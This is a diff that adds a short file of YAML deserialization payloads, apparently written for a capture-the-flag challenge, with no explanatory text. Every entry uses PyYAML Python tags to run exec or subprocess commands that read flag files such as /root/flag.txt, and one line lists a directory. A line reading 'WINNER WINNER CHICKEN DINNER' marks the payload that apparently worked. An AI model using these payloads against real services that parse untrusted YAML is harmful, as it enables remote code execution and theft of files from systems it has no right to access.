@@ -1,0 +1,22 @@
+import os; print os.listdir('.')
+
+
+
+!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"../../flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
+
+
+
+!!python/object/apply:subprocess.Popen
+!!python/object/apply:subprocess.Popen
+- !!python/tuple
+  - cat
+      - /root/flag.txt
+
+
+
+
+WINNER WINNER CHICKEN DINNER:
+!!python/object/apply:subprocess.getoutput [["$(cat /flag.txt)"]]
+
+
+
